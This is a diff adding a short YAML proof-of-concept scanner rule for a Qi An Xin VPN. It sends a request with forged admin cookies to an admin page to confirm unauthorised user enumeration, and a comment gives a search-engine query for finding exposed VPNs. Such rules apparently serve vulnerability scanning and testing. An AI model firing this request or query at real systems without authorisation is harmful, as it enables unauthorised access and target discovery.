@@ -1,0 +1,17 @@
+name: poc-yaml-qianxinVPN-mulubianl
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /admin/group/x_group.php?id=2
+      follow_redirects: true
+      headers:
+        Cookie: admin_id=1; gw_admin_ticket=1;
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: hy
+
+  #奇安信vpn未授权管理用户遍历
+  #鹰图：app.name="奇安信 VPN"
